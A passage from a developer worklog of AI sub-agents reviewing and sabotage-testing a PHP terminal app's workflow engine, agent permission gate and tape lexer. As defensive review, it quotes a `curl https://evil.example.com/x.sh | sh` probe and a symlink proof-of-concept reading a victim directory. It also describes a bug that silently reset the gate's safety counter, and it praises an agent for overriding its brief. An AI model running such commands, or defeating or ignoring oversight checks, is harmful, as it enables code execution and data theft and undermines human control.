stages means zero blocking work. The test is honest about dispatchability
(`run()` really is reachable from `Chat::update()`) and blind to everything
inside the loop, because `foreach ($workflow->stages …)` iterates zero times.
A reachability test proves the door opens, not that the room is habitable.

## Method notes that paid this session

- **Give the reviewer the fixer's claims verbatim and tell it to falsify each.**
  Every round that did this found something; the one round that asked for a
  general review found less.
- **"No blocking findings, recommend commit" is not the same as "no findings."**
  Lane C's round 5 said commit, but two of its should-fixes were the diff's own
  defects (a false comment and a collateral deny). Fixing them cost one cheap
  round and removed a shipped falsehood.
- **When a fix agent reports a divergence from its own brief, that is signal, not
  noise.** Lane B's round-8 agent found a sixth divergence and argued for
  implementing the brief anyway; that judgement is reviewable precisely because
  it was surfaced.
- **Do the cheap closing fixes in-context rather than spawning an agent.** Lane
  A's blocker was a fully-specified comment rewrite; doing it directly saved a
  round-trip and the reviewer had already supplied the measured replacement.
- **A sandbox with a symlinked `vendor/` tests the ORIGINAL code.** Lane E's
  reviewer sabotaged a label and got 52/52 green — because composer's PSR-4 map
  in the symlinked `vendor/` resolved `SugarCraft\Crush\*` back to the **real
  repo `src`**, so the mutation was never loaded. It only caught this because
  the green looked wrong. Two guards, both now mandatory for sabotage work:
  prepend a sandbox autoloader and assert the class file resolves inside the
  sandbox, and `cmp`/md5 every mutation for having actually changed bytes. The
  byte-guard has now paid twice — lane B's 81-mutation sweep reported 1 NO-OP
  (`agents.tape` Height→380 on a file already at 380) that would otherwise have
  read as a survived mutation.
- **A read-only reviewer should open with an `md5sum` baseline it can later
  `md5sum -c`.** Lane E's reviewer finished with two FAILED lines and was able to
  prove they were the concurrent workflow lane's writes, not its own — by diffing
  hunk ranges, showing zero overlap with its own subject, and `cmp`-ing the
  current file against the snapshot its probes ran against so its cited line
  numbers stayed valid. Without the baseline that is an argument; with it, it is
  a check.
- **Ten rounds of black-box probing beat one look for the source.** Lane B spent
  rounds 1-9 inferring vhs's lexer from `vhs validate` yes/no answers, each round
  finding exactly one more unmodelled construct. Round 10 found the Go source
  sitting on this box at
  `/home/my/go/pkg/mod/github.com/charmbracelet/vhs@v0.11.0`, copied
  `lexer/lexer.go` + `token/token.go` + `parser/parser.go` into a scratch module,
  built a token+command dumper, and found **three** false greens in one pass.
  Before probing a black box, check whether the box is actually open — a module
  cache, a vendor dir, a `-dev` package.
- **A probe's domain silently bounds its conclusion, and that is where sweeps
  lie.** Two instances, one round apart. Round 9's `#`-protection sweep used the
  same character as opener AND closer, so `{a#b{` had no `}`, `readJSON` ate to
  EOF along with the sentinel, and `{` scored as "does not protect `#`" — the
  64,009 opener/closer *pair* sweep found it immediately. Round 9's keyword sweep
  generated every **CamelCase** word, a domain that cannot produce `em`/`px`/`ms`
  /`s`/`m`/`true`/`false`, so "53 keywords, no 54th to miss" was wrong about a
  list of 60 — while its own probe detected all seven. Both times the probe was
  fine and the *domain* was the bug, which is invisible in a green result.
- Derive a fact from the **binary/source**, never from the project's own docs —
  both of vhs's shipped keyword lists were incomplete, and the repo's README and
  help screen have each been found stale.

## State at this point

**In flight (3 lanes):** B = round-8 review of the tokenizer (the only gate left
on #37); D = **#13** P2.3 constructing `WorkflowEngine`/`WorkflowRegistry` in
`Bootstrap::chat()`; E = **#38** P8.2 in-app keybinding reference.

Lane scopes chosen file-disjoint: B owns `.vhs/`+`examples/`+
`tests/VhsTapeContractTest.php`; D owns `Bootstrap.php`+`Workflows/`; E owns
`Chat.php`+`Tui/`+`Cli/Help.php`. E was told to report if it shifts line numbers
in `AgentDashboardPane.php` or `BackgroundSession.php`, since lane B's verified
citations point into both.

**Uncommitted in the tree:** lane B's four untracked tapes
(`agents/cli/diff/permission`), four untracked examples, untracked
`tests/VhsTapeContractTest.php`, and a modified `.vhs/chat.tape`. Plus lanes D
and E's in-progress work. Baseline on master: **5957 tests, 30024 assertions, 1
skipped, exit 0**.

**Open work order from here:** finish #37 (lane B) → #13/#38 (lanes D/E) → #63
`enforceTimeLimit` (small, protects every future lane; hold until no lane is
running the sugar-crush suite) → #12/#14/#17 rest of Phase 2 → #64 → the P3-P8
body → #58/#59/#60/#61, #49, #51, #55, and the new #74-#78.

## Client kill, 2026-08-17 ~01:50 — nothing lost

The client process was killed with all three lanes mid-run. Recovery worked
because each lane's work was already **on disk** and each agent's full reasoning
was in its own transcript under `subagents/agent-<id>.jsonl`; replacements were
spawned pointed at those transcripts rather than re-briefed from scratch. Lane B
had additionally taken its own `md5sum` baseline at start and verified the tree
byte-identical against it, which is what made "the reviewer changed nothing"
checkable rather than assumed. **Worth repeating: a read-only reviewer should
open with a baseline it can later `md5sum -c`.** The one hazard found was lane E
dying between an `Edit` to `tests/Renderer/KeyHelpTest.php` and the `sed -i` that
followed it — a half-applied pair is exactly where a broken file hides, so the
replacement was told to treat that file as suspect rather than as working.

# Session 2026-08-17 — three lanes through review/fix cycles, two crashes, a host migration

Nothing committed this session beyond the worklog itself. The three lanes below
are **uncommitted in the working tree** and each is mid-review. Read the "State
right now" section at the bottom first if resuming cold.

## Lane D — #13 (P2.3 workflow wiring): three fix rounds, two of them fixing the
## previous round's own defect

**Round 1 (implementation).** `Bootstrap::workflowEngine()` constructs the engine
from the launch's provider/model; `WorkflowEngine` gained `model`/`provider`
constructor params replacing `'claude-sonnet-4-6'`/`'anthropic'` at all six
`new Agent(...)` sites; `WorkflowRegistry` gained a `?string
$projectWorkflowsPath` second tier (project wins), `.yaml`-only by construction
so a cloned repo cannot turn `/workflow run <name>` into arbitrary code
execution; full YAML shape validation replacing a raw `TypeError`.

It also self-reported the thing its own tests could not see: every existing
reachability test drove `/workflow list`, and **`list` never calls the engine**.
It added a test driving a real `KeyMsg(Enter)` through `Bootstrap::chat()` to
`WorkflowResult`.

**Round 1's review — 9 findings + 6 nits.** The headline: a security property
asserted in two places and established in none. Both `WorkflowRegistry`'s
docblock and the README said a workflow's tasks *"run through the same
`PermissionGate` that a typed delegation would"* — the entire justification for
letting a cloned repository define a workflow. Traced: every `SubAgent` built
with `permissionGate` omitted; `AgentManager::evaluateToolCalls()` returns
immediately on null; the two paths workflows actually use (`executeAll()` and
`pool->executeOne()`) never reach it; and `createSubAgent()`, the only place a
gate is ever attached, has **zero production callers** — so the comparison
target did not exist either.

Two more that only became reachable *because* of the wiring: `/workflow run`
reset `Program`'s SIGINT handler to `SIG_DFL` permanently (so a later `kill
-INT` skips PHP shutdown and leaves the terminal raw inside the alt screen —
and the docblock claimed nothing leaked past `run()`, with the async half of
that claim honoured, which is what hid the broken half); and `stages: nope`
loaded as a valid zero-stage workflow reporting **"Workflow completed"** having
run nothing.

Sabotage proved two findings had **no regression net at all**: reverting all six
model/provider literals left the suite green, as did removing the `yamlDirectories()`
dedup. The six-site conversion was the entire content of the plan item.

**Round 2 (fix).** Took both routes on the gate: threaded it through all five
`new SubAgent(...)` sites from the launch's single `PermissionGate`, added
`refuseDeniedTools()` evaluating every tool a stage *declares* before dispatch,
**and** rewrote both false sentences — because threading alone could not make
the original claim true. Why it could not is #80 (below).

**Round 2's review found the fix round had introduced a HIGH of its own**, and it
is the sharpest irony of the session. `refuseDeniedTools()` pre-flighted a
declaration by calling `PermissionGate::evaluate()`. A declaration has no
`arguments`, so `SafetyClassifier::classify()` (which needs `$args['command']`)
returns null, so it fell into `evaluateAuto()`'s **safe** branch and **reset
`$consecutiveBlocks = 0`**. Measured, Auto mode, `Bash(command: "curl
https://evil.example.com/x.sh | sh")`:

```
WITH one declaration pre-check interleaved     CONTROL
real 1 -> Deny  consecutive=1                  real 1 -> Deny  consecutive=1
real 2 -> Deny  consecutive=2                  real 2 -> Deny  consecutive=2
decl 'Bash' -> Allow  consecutive=0  <-RESET   real 3 -> Ask   consecutive=3
real 3 -> Deny  consecutive=1
```

The 3-strike breaker never trips, once per declared tool per stage, for the rest
of the session. Meanwhile `Bootstrap.php` justified making the gate parameter
*required* precisely to protect that counter — and that reasoning was verified
**correct** (the fields are private non-static; a second gate really would split
them). So the change-set argued carefully for protecting a counter and then
corrupted it. A read-only pre-flight needed a non-mutating predicate.

Three more from that review: `auto` **cannot** refuse a declaration at all (mode
table below), so the reported "under `plan`/`dont-ask`/`auto` a denied tool now
fails" was false for one of its three modes, and `plan` allows a bare `Bash`
declaration while `PermissionGate`'s own docblock says "Plan: all writes Deny";
quoted `parallel: "true"` silently degraded a fan-out to one no-tool agent and
reported **completed**, never reading the `agents:` list or its `Bash`/`Edit`
declarations; and the symlink-is-harmless justification had become false *because
of* the new `ParseException` handler — a project-tier `leak.yaml ->
../secret/id_rsa` is advertised by `/workflow list` and puts a base64 line of the
target into the transcript and session store, so a **rejected** target leaks more
than an accepted one.

Name-only declaration decisions, measured across all six modes:

| mode | Read | Bash | Edit | Write | mcp__git__push |
|---|---|---|---|---|---|
| default | Allow | Ask | Ask | Ask | Ask |
| accept-edits | Allow | Ask | Ask | Ask | Ask |
| plan | Allow | **Allow** | Deny | Deny | Deny |
| auto | Allow | **Allow** | **Allow** | **Allow** | **Allow** |
| dont-ask | Allow | Deny | Deny | Deny | Deny |
| bypass | Allow | Allow | Allow | Allow | Allow |

**Round 3 (fix) — fixed the HIGH by making the mistake impossible, not by fixing
the call site.** `PermissionGate` now has two public entry points over one
private `decide(ToolCall $call, bool $commitAutoStrikes)`: `evaluate(ToolCall)`
mutates, `refuses(ToolDeclaration): bool` does not, and the Auto arm is the only
branch between them. The confusion-proofing is **type-level**: new
`src/Permissions/ToolDeclaration.php` deliberately has **no `toToolCall()`` — its
converter is `asNamedCallForGateOnly()`, marked `@internal` — and
`testTheTwoEntryPointsDoNotAcceptEachOthersArgument()` asserts the parameter
types reflectively, so "simplifying" `refuses()` back to a `ToolCall` fails the
suite. Live probe now reproduces the control column: `Deny, Deny, refuses=false,
**Ask**`.

On D2 it **declined to invent a policy**: `auto` genuinely cannot refuse a bare
name (the classifier judges arguments), so rather than fabricate a rule it
disclosed the gap as structural in three places and pinned the matrix as a data
provider cross-checked against `evaluate()`. A fabricated refusal rule would
have been a policy change disguised as a safety fix.

D3 took **both** halves: `realpath()` containment on project-tier symlinks
applied by the *identical* predicate in `baseNames()` and `load()`/`loadYaml()`
(user tier left unconfined — it is the tier whose `.php` files get `require`d),
**and** the parser message withheld regardless, keeping only `is not valid YAML
(line N)`. D4 refuses a non-boolean `parallel` rather than coercing. D5 added
`array_is_list()`. N-b lifted the pre-check to a whole-workflow pre-flight before
`installInterruptHandlers()`; N-d turned `$previousSignalHandlers` into a
push/pop stack. 21/21 sabotage cases red.

**Round 3 also found that round 2's D3b test did not bite.** Round 2's own
battery had printed `D3b parser message put back : GREEN — TEST DOES NOT BITE` —
the fixture's sentinel sat on a line the YAML parser does not quote, so the test
passed whether or not the leak was fixed. The repaired fixture was on disk and
**never re-verified** when the host died. That is the third test in this session
found to pass on sabotaged input.

## Lane E — #38 (P8.2 in-app keybinding reference)

Registry-driven so help text and routing cannot drift: `KeyBinding` +
`KeyBindingRegistry`, with `KeyboardHandler`'s two claim sets **derived from the
registry** (replacing the `SHELL_CTRL_RUNES`/`CHAT_CTRL_RUNES` consts), `?` bound
only on an empty input line, and a Veil overlay.

**The implementation round found two defects in its own predecessor's work.**
First, **the drift test did not bite**: every observation constructed its own
`KeyMsg`, so the registry's `keys` *label* — the only part a user reads — was
never exercised, and sabotaging `chat.palette` `Ctrl+P`→`Ctrl+X` left **52/52
green**. Fixed by driving each row from its own label; extending that to the
`(or …)` asides immediately caught a live doc bug (`(or j / k)` beside `↑ / ↓`
told the user `j` moves **up**). Second, an **over-wide frame line at `rows ≤ 4`**
— 77 columns on a 44-column terminal — root-caused to a `max(2, rows - 4)` floor
letting the overlay reach the status-bar row, where Veil composites without
truncating and the status bar is not width-truncated. Removing the floors was
right rather than raising them.

**Its review confirmed both fixes hold** (11,700 reflection-driven renders, cols
1–130 × rows 1–45, at top and clamped-to-end scroll: 0 width and 0 height
violations; 850 composited combos including 1×1; `HAND_DRIVEN` proven un-abusable)
and then found **the regression the good change had caused**: deriving the claim
sets added `r` to `chatCtrlRunes()`, and the docblock claimed that changed "the
one case" while measurement showed three. The consequential one — `Ctrl+R` in
`Pane::Agents` opens Chat's session picker *underneath* the full-pane agent
dashboard, where `↑/↓/Enter` are claimed by `handleAgentViewKey()`, so the modal
can be neither moved nor committed. Previously a silent no-op. Plus: the
overlay-chain precedence comment was **inverted** (the reference is routed
**first** at 707 and painted **last** at 847 — the opposite of the invariant the
other three overlays are justified by), with the change-set's own test asserting
the forbidden state and its docblock repeating the false claim.

**The fix round** declared the exception **in the registry** rather than beside
it (`yieldsToShellReason` + `chatCtrlRunesYieldedToShell()`), added
`KeyboardHandler::shellOwnsKeyboard(App)` as a named predicate that also
**replaces claim rules 2/3/3b** so `claims()` and `chatOwns()` read one rule, and
stated the real criterion honestly — *not* "opens a Chat overlay" (`Ctrl+P` does
too and is excluded, because `Ctrl+K` in `Pane::Agents` is a shell chord
`consumeShellCmd()` translates into a `Ctrl+P` fed to the hosted Chat, so
refusing it would remove one of two doors, not the room). For Decision B it kept
routing and **reordered the chain to match**, with a bonus: `renderKeyHelp()`
first means it runs every frame, structurally killing the stale-ceiling nit. It
also made all four `(or k / j)` rows direction-sensitive (three of four had
passed when reverted individually, because wrapping list handlers make "up from
0" satisfy `assertNotSame`), fixed `overlay()`'s box extractor (the old one read
**8 rows vs the real 23** at 80×24, making the height guard vacuous at every
realistic width), and gave the open-but-unpaintable state a status-bar cue.

It wrote a wrong count itself (52/56) and **its own new shape test caught it**
during a sabotage run — evidence the guard works.

## Lane B — #37 (VHS tapes + examples): rounds 8→11, and the oracle change

The chain: rounds 1–4 fixed column anchoring, multi-directive lines, joined
quoted args, and values continuing across lines; round 7 replaced all of it with
a whole-file token stream; round 8 found `/` opens a regex (three of four
`#`-protecting characters modelled).

**Round 10 changed the oracle and that is the lesson.** Nine rounds inferred the
lexer from `vhs validate`'s yes/no answers. Round 10 found the vhs v0.11.0 **Go
source** on the box, copied `lexer.go`/`token.go`/`parser.go` into a scratch
module, built a token+command dumper, and found **three** false greens in one
pass: the `{`…`}` **JSON token** (asymmetric closer, *not* newline-bounded, so
`Set WaitPattern {#} Set Shell "sh"` hides a render-aborting directive and also
hides `Source`, defeating the escape hatch `testNoTapeSourcesAnotherFile` exists
to close); **backslash escapes inside a regex** (odd run escapes the delimiter —
`/a\/#b/` and the realistic `/https:\/\/x#y/`); and **a backslash before a
newline carrying a regex across the line**, because `readRegex`'s escape branch
`continue`s past the `isNewLine` break.

**Round 11 fixed all three and found two more mechanisms unprompted**: an
upstream **panic** (an open regex with a trailing backslash run at EOF slices
past `len(input)` → exit 2; measured on `/a\`, `/a\\`, `/a\\\`, not on `/a`,
`/a/`, `/a\ `, `/a\`+newline), and **a comment as a setting's value** —
`parseSet` reads `p.peek.Literal` ungated, so `Set Theme #Dracula` really sets
`Dracula` and `Set Shell #sh` really aborts the render.

On the "N places over-approximate" sentence it made the right structural call.
That sentence had been falsified three times (two → three → wrong again), so
instead of writing a fourth count it changed **form**: derivation + oracle +
named exceptions, **no count**, resting on `parseType`/`parseCopy` looping on
`token.STRING` and `parseSet` taking exactly one token — both re-checkable in
`parser.go`. And `KEYWORDS` is no longer a swept list but **the map
`LookupIdentifier` consults**, so completeness is by construction rather than by
sweep. First round in twelve whose correctness argument does not depend on a
sweep having had the right domain.

It left the differential harness behind with its numbers — 73,920 generated
tapes, 24,846 parsing clean, **0 miss-direction divergences against the fixed
model and 156 against a reconstructed round-9 model** — specifically so a rebuild
scoring 0 against *both* is recognisable as broken rather than as passing.

**On the candy-vcr point** (raised mid-session by the user): upstream vhs is a
**transitional** dependency and candy-vcr is meant to replace it outright, but CI
still renders the ~49-lib matrix with upstream while candy-vcr is a
candy-core-only non-blocking soak. Round 11 verified the successor's behaviour
from `candy-vcr/src/Tape/` **source** rather than assuming, and documented that
`Set Shell "sh"` is **legal** there (`Compiler` records the name,
`TapeToGif::resolveShell()` prefers `--shell`, `FrameStream` runs it under a PTY)
— so the day candy-vcr renders, these lexer regression tests need a different
sentinel. `GRID_ROWS_BY_HEIGHT` is labelled *unverified-post-switch* rather than
wrong, since those rows were measured in upstream's headless browser. Nothing
weakened, nothing removed. See **#81**.

## The transferable lessons this session

- **A probe's domain silently bounds its conclusion, and a green result cannot
  show you the domain was wrong.** Two instances one round apart. Round 9's
  `#`-protection sweep used the same character as opener AND closer, so `{a#b{`
  had no `}`, `readJSON` ate to EOF along with the sentinel, and `{` scored as
  "does not protect `#`" — the 64,009 opener/closer **pair** sweep found it
  immediately. Round 9's keyword sweep generated every **CamelCase** word, a
  domain that structurally cannot produce `em`/`px`/`ms`/`s`/`m`/`true`/`false`,
  so "53 keywords, no 54th to miss" was wrong about a list of **60** — while its
  own probe would have detected all seven. Both times the probe was correct.
- **Before probing a black box, check whether the box is open.** Ten rounds of
  inference lost to a Go module cache nobody looked in.
- **A sandbox with a symlinked `vendor/` tests the ORIGINAL code.** Lane E's
  reviewer sabotaged a label and got 52/52 green because composer's PSR-4 map in
  the symlinked `vendor/` resolved `SugarCraft\Crush\*` back to the real repo
  `src`. Mandatory now: prepend a sandbox autoloader and assert
  `ReflectionClass::getFileName()` resolves inside the sandbox.
- **md5/`cmp`-guard every mutation for having actually changed bytes.** Paid
  twice: lane B's 81-mutation sweep reported 1 NO-OP (`agents.tape` Height→380 on
  a file already at 380) that would otherwise have read as a survived mutation.
- **A read-only reviewer should open with an `md5sum` baseline it can later
  `md5sum -c`.** Lane E's reviewer finished with FAILED lines and *proved* they
  were a concurrent lane's writes — by hunk-range diffing, by `cmp`-ing the
  current file against the snapshot its probes ran on (so its line citations
  stayed valid), and by naming a reviewed file it predicted would **not** change
  (`CommandRegistry.php`) as the control. Predicting the control is the strong
  part.
- **Three separate tests were found passing on sabotaged input** (lane E's drift
  test, lane D's D3b leak test, lane D's six-literal conversion). Sabotage is not
  optional garnish; it is the only thing that distinguishes a test from a
  comment.
- **Fixing a comment is a change, and a fix round is exactly where new false
  claims get written.** Lane D's round 2 existed to make false comments true and
  introduced a HIGH plus three new false claims. Review fix rounds as hard as
  implementations.
- **A reviewer overriding its brief is signal, not disobedience.** Lane B's
  round-9 agent re-ran a sweep I told it not to, because the docblock states
  "exactly four of 94" and a number it writes is a number it measured. It was
  right. Separately, the second probe form I supplied was **invalid** — vhs
  echoes the offending source line, so any sentinel in the tape self-matches, and
  its first attempt scored 35 false hits before it noticed.

## New tracker items filed this session

**#78** four `tests/McpClientTest.php` cases spawn a child that exits immediately
(`/bin/true`, `echo`) as a fake MCP server, then write the 129-byte `initialize`
handshake to its stdin — a kernel race. Lost: `fwrite(): … errno=32 Broken pipe`
notice at `src/McpClient.php:170`, then `$written === false` throws at :173.
Three back-to-back runs of the untouched file went OK → error → OK, and it
reproduces in a standalone `php -r` with `proc_open('true')` and zero sugar-crush
code loaded. Fix: a child that stays alive (`cat`, `sleep`).

**#79** `/workflow run` **freezes the TUI**. `Chat.php` calls
`WorkflowEngine::run()` synchronously inside `Chat::update()`, i.e. on the
ReactPHP loop, and `executeStage()` → `AgentWorkerPool::executeOne()` →
`ProcessExecutor::execute()` is a blocking `stream_select` until the worker
finishes or `SubAgent::$timeout` (default **300s**) expires — no repaint, no
keystrokes, no spinner; `workflows/deep-research.php` is a 5-stage pipeline.
Created by P2.3: the path existed but could not be entered from the TUI before.
The answer's shape already exists in `EngineBackend::completeAsync()`
(fork+socket). Deliberately NOT bundled into #13.

**#80** `ProcessExecutor::createInlineWorkerScript()`
(`src/Agents/ProcessExecutor.php:507-643`) is **still the P1.S5 simulation** — the
worker echoes `[name] Processing: <task>`, heartbeats, then `complete` with
`output: "[name] Task finished: <task>"`, `tokensUsed: 0`, `costUsd: 0.0`. No
provider request, no HTTP, no tool call. Independently confirmed twice. So a
workflow stage does not reach a live model, and **no tool call exists on the pool
path for a `PermissionGate` to evaluate** — which is why threading the gate could
not by itself make #13's gate claim true. Documented as a README limitation.

**#81** port the vhs lexical grammar into `candy-vcr/src/Tape/Lexer.php`, which
today is line-oriented with **no JSON token and no regex token** — i.e. vulnerable
to all five `#`-hiding constructs. The grammar was derived from the Go source this
session; record it portably rather than spending it on assertions. Related trap:
assertions that hold only because *upstream* is the renderer must be **labelled**,
never removed.

**#82** `src/Tui/Components/MenuBar.php:362-368` has the same orphaned-docblock
defect lane E fixed in `Renderer.php` — `activateMenu()`'s docblock sits above the
*next* method's docblock and `activateMenu()` (`:469`) has none. Two instances of
one defect means a grep across the lib, not a third point fix.

## Two client crashes and a host migration

**Crashes at ~01:50 and ~04:00** killed all three lanes mid-run. Recovery worked
both times because each lane's work was already **on disk** and each agent's
reasoning was in `subagents/agent-<id>.jsonl`; replacements were spawned pointed
at those transcripts rather than re-briefed from scratch.

Hazards the crashes exposed, now folded into every brief:
- A killed agent can leave a **sabotage mutation applied to the real tree**. Lane
  E's reviewer was mid-mutation on `src/Chat.php` (wheel sign flip) when the
  second crash hit. It happened to have been restored — verified `:2483` holds the
  original `- $notch`, everything lints, no `.bak`/`.sabbak`/`.orig` — but relying
  on that is luck. Sabotage in the real lib dir now requires a **trap that runs on
  abnormal exit**.
- A **half-applied Edit/`sed -i` pair** is where a broken file hides, and `php -l`
  cannot see a logically unfinished edit.
- **Unbounded backgrounded pollers outlive their agent** and produce a run of
  completion notifications with no payload. The tell is a summary repeating
  numbers already reported. Bound every poll.

**Host migration.** The old server died of memory exhaustion under concurrent
agents; the repo and `~/.claude` were copied to a new box. What survived: the
repo (all 35 uncommitted lane files, git at `72c14eb4`) and all three agent
transcripts. What did not, and what was done:

- **`/usr/local/bin/vhs` gone.** Rebuilt from source; the binary now lives at
  **`/tmp/vhsbin/vhs`** (`vhs version v0.11.0`, `validate` clean).
- **The vhs Go source was gone.** Restored with `go mod download
  github.com/charmbracelet/vhs@v0.11.0` → back at
  `/home/my/go/pkg/mod/github.com/charmbracelet/vhs@v0.11.0`. Go 1.26.1 present.
- **All `/tmp` scratchpads gone** — lane B's differential harness and lane E's
  mutation harness must be rebuilt from transcripts.
- **PHP extensions missing**, which blocked everything. `dom`/`xmlwriter`/
  `simplexml`/`xmlreader` (PHPUnit would not start at all), then `sqlite3` +
  `pdo_sqlite` (**389** errors: `Class "SQLite3" not found` ×111, `PDOException:
  could not find driver` ×278), then `gd` (**5** errors,
  `imagecreatetruecolor()`). Installed as identified.
- **Still absent and expected to stay so:** `ext-uv` (so `Loop::get()` returns
  `StreamSelectLoop` and the loop pins committed in `76f34813` are inert here —
  harmless, but that timing work cannot be reproduced on this box), and
  `ttyd`/`ffmpeg` (so vhs cannot *render*; `validate` and the parser work, which
  is all a lexing question needs).
- **No network and no provider credentials** here, so ~27 skips versus 1 on the
  old host, plus one integration failure — `cURL error 7: Failed to connect to
  localhost port 30000`, `connection refused`, `provider 'openai' … requires
  'apiKey'`.

**Consequence for anyone reading old numbers in this file: every suite figure
above was measured on the dead host.** Re-establish a baseline before calling
anything a regression, and judge a sabotage by whether *the specific test that
should catch it* flips green→red, not by a diff of suite totals — the
environmental errors swamp totals.

## State right now

**In flight (3 lanes, all mid-review, nothing committed):**

- **Lane D / #13** — review of fix round 3. Priority is the `refuses()` /
  `ToolDeclaration` type-level guard: whether any mutable state is still touched
  on the read-only path, whether `asNamedCallForGateOnly()` (`@internal` is
  documentation, not enforcement) can be reached from a declaration, and whether
  the two entry points genuinely share one decision.
- **Lane E / #38** — review of its fix round. Priority is whether replacing claim
  rules 2/3/3b with `shellOwnsKeyboard()` moved routing in an unprobed state
  (this lane has changed routing twice while fixing something else), and whether
  reordering the chain can leave a **pending permission prompt invisible**.
- **Lane B / #37** — round-12 review. Priority is the corpus **domain**: what a
  6×8×22×7×5 product cannot contain (nested constructs, two constructs on one
  line, `\r\n`, non-ASCII, three-line constructs, multiple sentinels, empty
  middles), since domain bugs are how this chain's sweeps failed twice.

**Uncommitted tree:** lane B's four untracked tapes + four untracked examples +
`tests/VhsTapeContractTest.php` + modified `.vhs/chat.tape`; lane D's
`src/Permissions/ToolDeclaration.php`, `tests/Permissions/PermissionGateDeclarationTest.php`,
`tests/Workflows/WorkflowFailureReportingTest.php` and modifications to
`PermissionGate.php`/`WorkflowEngine.php`/`WorkflowRegistry.php`/`WorkflowResult.php`/
`Bootstrap.php`; lane E's `src/Commands/KeyBinding.php`, `KeyBindingRegistry.php`,
`tests/Commands/KeyBinding*`, `tests/Renderer/KeyHelpTest.php` and modifications
to `Chat.php`/`Renderer.php`/`KeyboardHandler.php`/`CommandRegistry.php`. Both
lanes D and E have hunks in `src/Chat.php` and `README.md` — verified
non-overlapping.

**Work order from here:** land #37/#13/#38 → #63 `enforceTimeLimit` (hold until no
lane is running the suite) → #12/#14/#17 rest of Phase 2 → #64 → the P3-P8 body →
#58/#59/#60/#61, #49, #51, #55, and #74-#82.

# Session 2026-08-17 (continued) — host fully provisioned, three review rounds landed

Appended after the migration write-up above. Read that first for the environment
history; this section supersedes its "State right now".

## Host is now fully provisioned and the suite is GREEN

Every extension gap is closed. Confirmed present: `dom` `xmlwriter` `simplexml`
`xmlreader` (PHPUnit would not start without the first two), `sqlite3`
`pdo_sqlite` (389 errors), `gd` (5 errors), plus `mbstring` `tokenizer` `pcntl`
`posix` `ffi` `sockets` `curl`. **`ext-uv` is now installed as well**, so
`Loop::get()` returns `ExtUvLoop` again and the loop pins committed in `76f34813`
are live rather than inert — the stale-clock reasoning in those three
`tests/bootstrap.php` files applies on this box after all. `swoole 6.2.1` is also
enabled, though **nothing in the repo uses it**: no `composer.json` requires it
and there is not one `Swoole\` reference under `sugar-crush/src` or
`sugar-crush/tests`. This stack is ReactPHP; swoole is inert here.

**Baseline on this host, measured twice independently (coordinator + lane E's
reviewer, identical):**

```
Tests: 6246, Assertions: 38073, Skipped: 1.   OK   (~2 min)
```

The single skip is the legitimate
`Tests\MCP\McpClientTest::testLoadConfigReturnsEmptyArrayWhenFileGetContentsFails`.
**Test count is identical to the dead host's 6246**, which confirms the migration
cost nothing but environment. Lane-only figures: `tests/Workflows` +
`tests/Permissions` = 347/823; the keybinding trio = 171/7749.

Standing instruction that came out of this and should outlive it: **judge a
sabotage by whether the targeted test file flips green→red, never by a diff of
suite totals.** While extensions were missing, totals were swamped by 394
environmental errors and a totals-diff would have read as "mutation survived" for
every case.

## Lane D — #13: review round 3 came back COMMIT-grade on the part that mattered

The `refuses(ToolDeclaration)` / `evaluate(ToolCall)` split **holds**, and the
review proved it rather than sampling it:

- **Code-level proof, not a sample.** `SafetyClassifier::classify()` returns
  non-null only when `name === 'Bash'` **and** `arguments['command']` is a set
  string (`SafetyClassifier.php:252,263`). `ToolDeclaration::asNamedCallForGateOnly()`
  builds `new ToolCall($name)` → `arguments === []`. So `classify()` is null for
  *every possible* declaration, `evaluateAuto()` would always take its `Allow`
  branch, and that is exactly what `autoDeclarationDecision()` returns. The two
  arms **cannot** disagree on the decision; the only difference is the counter
  write.
- **Recursive property fingerprint** of the gate and its delegates across
  780 `refuses()` probes (13 names × 5 rule-sets × 6 modes × classifier/none):
  **no field ever changed.** `$mode`/`$rules`/`$classifier` are `readonly`, and
  `SafetyClassifier` has **zero properties** — its patterns are a `const`. No
  cache, no memo, no matcher state.
- **The reason the type guard really holds, which nobody had tested:** a caller
  file *without* `declare(strict_types=1)` still gets a `TypeError`, because PHP
  never coerces between two distinct class types in either mode. The guard is
  **engine-enforced, not convention-enforced**. Both classes are `final` with no
  parent/interface/trait, so there is no shared supertype to widen a parameter to;
  `PermissionGate` is `final` and `decide()` is `private`.
- `asNamedCallForGateOnly()` has exactly **one** caller (`PermissionGate.php:145`)
  and `refuses()` exactly one production caller (`WorkflowEngine.php:1235`), so
  `@internal` is doing no load-bearing work — the reachability is what is narrow.
- **26 mutations, 22/22 expect-RED went red, and the *named* test failed each
  time.** Round 2's non-biting D3b fixture is independently confirmed repaired.
- D2's "not fixable under `auto` without inventing policy" is **true, not merely
  hard** — the same proof shows the classifier cannot judge a bare name.

**The one real finding, and its framing is the point.** A repository can commit
`.sugar-crush/workflows` as a **symlink to a victim directory**. `containedIn()`
resolves *both* sides with `realpath()`, so when the workflows directory is itself
the link the boundary moves with it and nothing is ever outside:

```php
symlink('/tmp/c4/victim', '/tmp/c4/repo/.sugar-crush-workflows');
new WorkflowRegistry($userDir, '/tmp/c4/repo/.sugar-crush-workflows');
// list() -> ["broken","creds"];  load('creds') -> LOADED, description='SENTINEL-VICTIM-CONTENT'
```

Exposure, honestly bounded: enumeration of `[a-zA-Z0-9_-]+\.yaml` basenames in any
readable directory, plus `name`/`description`/prompts of any that parse as a
workflow map (and those prompts become agent tasks). **The other half of the D3 fix
still holds inside the hole** — a linked-in file's parse error reported `…is not
valid YAML (line 2). The parser message is withheld…`, sentinel absent, so no raw
content escapes even here. And **the identical property exists in the
`SkillLoader::contained()` idiom this code cites as its own precedent**
(`:337-351`, `@param list<string> $boundaries already-canonical`) and in
`README.md:305` — so it is a **systemic property of the codebase's containment
idiom, not a regression this round introduced.** The reportable defect is that
round 3 wrote it up as absolute.

Everything else in that surface held and must not regress: plain link out;
relative chain `a.yaml → b.yaml → ../secret/id_rsa`; symlinked **sub**directory;
**dangling** link (filtered by `is_file()` before `realpath()`); sibling-prefix
`proj → ../projevil/x.yaml`; and a **TOCTOU** swap between `list()` and `load()`
(refused because `load()` re-applies the predicate at read time). The user tier
stays deliberately unconfined — it is the tier whose `.php` files get `require`d.

Four nits, two of them the recurring class: the duplicate-stage-name message is
**the only one of 13 load-error paths that echoes file content back**
(`WorkflowRegistry.php:564`) and is the undocumented exception to the policy this
round established; `autoDeclarationDecision()`'s null-classifier `Ask` → `Allow`
survives both permission test files green; **the trailing-separator guard
(`:317`) is load-bearing and untested** — dropping it leaves `WorkflowRegistryTest`
